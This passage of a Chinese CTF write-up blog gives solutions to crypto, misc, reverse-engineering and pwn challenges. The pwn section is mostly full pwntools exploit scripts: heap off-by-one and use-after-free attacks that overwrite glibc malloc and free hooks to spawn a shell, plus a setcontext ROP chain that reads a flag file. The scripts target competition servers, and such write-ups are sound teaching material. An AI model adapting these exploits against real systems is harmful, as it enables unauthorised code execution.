568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line">phi = (p2*p2-p2)*(q2**<span class="number">3</span>-q2*q2)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = gmpy2.powmod(c2,d,n2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>

<p>两部分合起来得到flag</p>
<blockquote>
<p>flag{Euler_funct1ons_1s_very_interst1ng}</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="warmup-音频隐写"><a href="#warmup-音频隐写" class="headerlink" title="[warmup]音频隐写"></a>[warmup]音频隐写</h3><p>直接AU打开看频谱图</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929181718979.png"></p>
<blockquote>
<p>flag{f8fbb2c761821d3af23858f721cc140b}</p>
</blockquote>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="hellowrold"><a href="#hellowrold" class="headerlink" title="hellowrold"></a>hellowrold</h3><p>花指令</p>
<p><img src="https://i.loli.net/2021/09/29/PiNwMYOFXLHadZQ.png" alt="image-20210929174801894"></p>
<p><img src="https://i.loli.net/2021/09/29/IWLsxokKbfScG3V.png" alt="image-20210929174822597"></p>
<p><img src="https://i.loli.net/2021/09/29/tmYNM1f8AP34Jar.png" alt="image-20210929175019760"></p>
<p><img src="https://i.loli.net/2021/09/29/JxfPyDNlZMY8HXA.png"></p>
<p><img src="https://i.loli.net/2021/09/29/4R1pOiyYjNTDb2A.png"></p>
<p>尝试修了一下（。然后勉强能看到逻辑<br>大概意思就是循环字符长度次数的（input[i]^0x22)+3</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=[</span><br><span class="line"><span class="number">188</span>,<span class="number">10</span>,<span class="number">187</span>,<span class="number">193</span>,<span class="number">213</span>,<span class="number">134</span>,<span class="number">127</span>,<span class="number">10</span>,<span class="number">201</span>,<span class="number">185</span>,<span class="number">81</span>,<span class="number">78</span>,<span class="number">136</span>,<span class="number">10</span>,<span class="number">130</span>,<span class="number">185</span>,<span class="number">49</span>,</span><br><span class="line">    <span class="number">141</span>,<span class="number">10</span>,<span class="number">253</span>,<span class="number">201</span>,<span class="number">199</span>,<span class="number">127</span>,<span class="number">185</span>,<span class="number">17</span>, <span class="number">78</span>, <span class="number">185</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">87</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xoor</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((a-<span class="number">3</span>)^<span class="number">0x22</span>)&amp;<span class="number">0xff</span></span><br><span class="line">a=<span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    a=s[k]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line"></span><br><span class="line">        a=xoor(a)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#flag&#123;helo_w0rld_W3lcome_70_R3&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="打卡"><a href="#打卡" class="headerlink" title="打卡"></a>打卡</h3><p>送分题？还害我搞了半天。。<br>直接androidkiller打开改 not admin 为admin，</p>
<p><img src="https://i.loli.net/2021/09/29/mk9I4PYOT6sR8bC.png"></p>
<p>编译，安装<br>然后直接点一下图片就出了</p>
<p><img src="https://i.loli.net/2021/09/29/4NkrmxGQL6A1yne.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1cd8a8623acf512ea7a96c5305f1be9f&#125;</span><br></pre></td></tr></table></figure>

<h3 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h3><p>也有指令。nop去掉。<br>#11 22 33</p>
<p><img src="https://i.loli.net/2021/09/29/RFuBkpqt8DZ3JyE.png"></p>
<p>可以正常f5</p>
<p><img src="https://i.loli.net/2021/09/29/F5p9C6Tw32mIJMu.png"></p>
<p>发现是一个流密码rc4，，不管，我们随便输入密文长的明文进来。，<br>然后dump出假密文，然后用假密文异或假明文得到密钥流，然后用密钥流对密文进行异或得到明文</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d=[  <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0x8D</span>, <span class="number">0xE4</span>, <span class="number">0x9F</span>, <span class="number">0xA5</span>, <span class="number">0x28</span>, <span class="number">0x65</span>, <span class="number">0x30</span>, <span class="number">0xF4</span>,</span><br><span class="line">  <span class="number">0xEB</span>, <span class="number">0xD3</span>, <span class="number">0x24</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>, <span class="number">0x1A</span>, <span class="number">0x6F</span>, <span class="number">0xD4</span>, <span class="number">0x6A</span>, <span class="number">0xD7</span>,</span><br><span class="line">  <span class="number">0x0B</span>, <span class="number">0x8D</span>, <span class="number">0xE8</span>, <span class="number">0xB8</span>, <span class="number">0x83</span>, <span class="number">0x4A</span>, <span class="number">0x5A</span>, <span class="number">0x6E</span>, <span class="number">0xBE</span>, <span class="number">0xCB</span>,</span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x4B</span>, <span class="number">0x99</span>, <span class="number">0xD6</span>, <span class="number">0xE6</span>, <span class="number">0x54</span>, <span class="number">0x7A</span>, <span class="number">0x4F</span>, <span class="number">0x50</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0xE5</span>, <span class="number">0xEC</span>]</span><br><span class="line">dd=[  <span class="number">0xA3</span>, <span class="number">0xD0</span>, <span class="number">0xDC</span>, <span class="number">0xB3</span>, <span class="number">0xD4</span>, <span class="number">0xF6</span>, <span class="number">0x2D</span>, <span class="number">0x30</span>, <span class="number">0x30</span>, <span class="number">0xA2</span>,</span><br><span class="line">  <span class="number">0xEE</span>, <span class="number">0x85</span>, <span class="number">0x22</span>, <span class="number">0xB4</span>, <span class="number">0xC7</span>, <span class="number">0x1D</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x77</span>, <span class="number">0xD2</span>,</span><br><span class="line">  <span class="number">0x59</span>, <span class="number">0x84</span>, <span class="number">0xBA</span>, <span class="number">0xA5</span>, <span class="number">0x8A</span>, <span class="number">0x42</span>, <span class="number">0x52</span>, <span class="number">0x38</span>, <span class="number">0xA3</span>, <span class="number">0xC9</span>,</span><br><span class="line">  <span class="number">0xFC</span>, <span class="number">0x1D</span>, <span class="number">0x99</span>, <span class="number">0xD2</span>, <span class="number">0xE0</span>, <span class="number">0x55</span>, <span class="number">0x7B</span>, <span class="number">0x48</span>, <span class="number">0x58</span>, <span class="number">0x14</span>,</span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0xA1</span>]</span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;000000000000000000000000000000000000000000&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i])^dd[i]^d[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#flag&#123;c5e0f5f6-f79e-5b9b-988f-28f046117802&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="抛石机"><a href="#抛石机" class="headerlink" title="抛石机"></a>抛石机</h3><p>照着题目抄一遍成z3，利用了<a target="_blank" rel="noopener" href="https://blog.csdn.net/xingzhe22222/article/details/95477221">网上</a>抄的一个浮点数转hex的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_to_hex</span>(<span class="params">f</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(struct.unpack(<span class="string">&#x27;&gt;Q&#x27;</span>, struct.pack(<span class="string">&#x27;&lt;d&#x27;</span>, f))[<span class="number">0</span>] &amp; <span class="number">0xffffffff</span>)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">x = Real(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">y = Real(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">z = Real(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">m = Real(<span class="string">&#x27;m&#x27;</span>)</span><br><span class="line">v4 = <span class="number">149.2</span> * x + x * -<span class="number">27.6</span> * x - <span class="number">129.0</span></span><br><span class="line">v3 = <span class="number">149.2</span> * y + y * -<span class="number">27.6</span> *y - <span class="number">129.0</span></span><br><span class="line">v2 = z * -<span class="number">39.6</span> * z + <span class="number">59.2</span> *z + <span class="number">37.8</span></span><br><span class="line">v1 = m * -<span class="number">39.6</span> * m + <span class="number">59.2</span> * m + <span class="number">37.8</span></span><br><span class="line">s = Solver()</span><br><span class="line">s.add(x &lt; y - <span class="number">0.001</span>)</span><br><span class="line">s.add(z &lt; m - <span class="number">0.001</span>)</span><br><span class="line">s.add(v4 &gt; -<span class="number">0.00003</span>,v4 &lt; <span class="number">0.00003</span>)</span><br><span class="line">s.add(v3 &gt; -<span class="number">0.00003</span>,v3 &lt; <span class="number">0.00003</span>)</span><br><span class="line">s.add(v2 &gt; -<span class="number">0.00002</span>,v2 &lt; <span class="number">0.00002</span>)</span><br><span class="line">s.add(v1 &gt; -<span class="number">0.00003</span>,v1 &lt; <span class="number">0.00003</span>)</span><br><span class="line"></span><br><span class="line">s.check()</span><br><span class="line"><span class="built_in">print</span>(s.model())</span><br><span class="line">z = -<span class="number">1012239</span>/<span class="number">2097152</span></span><br><span class="line">y = <span class="number">141727</span>/<span class="number">32768</span></span><br><span class="line">x = <span class="number">1133125</span>/<span class="number">1048576</span></span><br><span class="line">m = <span class="number">259211</span>/<span class="number">131072</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span>+double_to_hex(x)+<span class="string">&#x27;-&#x27;</span>+double_to_hex(y)[:<span class="number">4</span>]+<span class="string">&#x27;-&#x27;</span>+double_to_hex(y)[<span class="number">4</span>:]+<span class="string">&#x27;-&#x27;</span>+double_to_hex(z)[:<span class="number">4</span>]+<span class="string">&#x27;-&#x27;</span>+double_to_hex(z)[<span class="number">4</span>:]+double_to_hex(m)+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;454af13f-f84c-1140-1ee4-debf58a4ff3f&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="Null-pwn"><a href="#Null-pwn" class="headerlink" title="Null_pwn"></a>Null_pwn</h3><p>解题思路：有off by one漏洞，且show功能正常，直接利用残留指针泄露libc，再改size造成堆重叠，实现任意chunk分配，打mallochook。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./null_pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;82.157.5.28&#x27;</span>,<span class="number">51204</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/root2/Desktop/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size of Heap : &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Content?:&#x27;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Content?:&#x27;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x4f0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))+<span class="number">0x7f60e8812000</span>-<span class="number">0x7f60e8bd6b0a</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\xe1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xd0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x71</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0xf1247</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(6,0x10,&#x27;aaa&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>

<h3 id="ezuaf"><a href="#ezuaf" class="headerlink" title="ezuaf"></a>ezuaf</h3><p>解题思路:有uaf漏洞，free个fastbin范围外的chunk再show泄露残余指针算libc基地址，再edit那个0x70大小的chunk的fd，实现任意chunk分配，打mallochook。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./uaf_pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;82.157.5.28&#x27;</span>,<span class="number">50702</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/root2/Desktop/glibc-all-in-one-master/libs/2.23-0ubuntu11.2_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size&gt;&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;content&gt;&#x27;</span>,<span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">4</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;index&gt;&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">0x7f3068b0fb78</span>+<span class="number">0x7f306874b000</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(libc_base+<span class="number">0x4527a</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0364 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1207 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>

<h3 id="GreentownNote"><a href="#GreentownNote" class="headerlink" title="GreentownNote"></a>GreentownNote</h3><p>解题思路：2.27的libc，有uaf漏洞，还是利用残余指针泄露，再用tcache double free打freehook，再用setcontext劫持执行流到堆区执行布置好的rop实现orw。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./GreentownNote&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;82.157.5.28&#x27;</span>,<span class="number">50901</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/root2/Desktop/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,con</span>):</span></span><br><span class="line">	menu(<span class="number">1</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; Note size :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; Content :&#x27;</span>,<span class="built_in">str</span>(con))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">2</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;| Index :&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	menu(<span class="number">3</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;| Index :&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;| Content: &#x27;</span>)</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;heap_base:&#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;| Content: &#x27;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x7fa6ff1f6ca0</span>+<span class="number">0x7fa6fee0b000</span></span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi=libc_base+<span class="number">0x000000000002155f</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000023e6a</span></span><br><span class="line">pop_rdx=libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">ret=libc_base+<span class="number">0x00000000000008aa</span></span><br><span class="line"></span><br><span class="line">flag=heap_base+<span class="number">0x559ccab80570</span>-<span class="number">0x559ccab80260</span></span><br><span class="line">orw=heap_base+<span class="number">0x562a3e8eb680</span>-<span class="number">0x562a3e8eb260</span></span><br><span class="line">success(<span class="string">&#x27;flag:&#x27;</span>+<span class="built_in">hex</span>(flag))</span><br><span class="line">success(<span class="string">&#x27;orw:&#x27;</span>+<span class="built_in">hex</span>(orw))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop=p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x1000</span>)+p64(pop_rdx)+p64(<span class="number">0x100</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x1000</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = orw</span><br><span class="line">frame.rip = ret</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,rop)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x200</span>,p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="built_in">str</span>(frame))</span><br><span class="line">add(<span class="number">0x200</span>,p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]+<span class="number">53</span>+libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *setcontext+53&#x27;)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

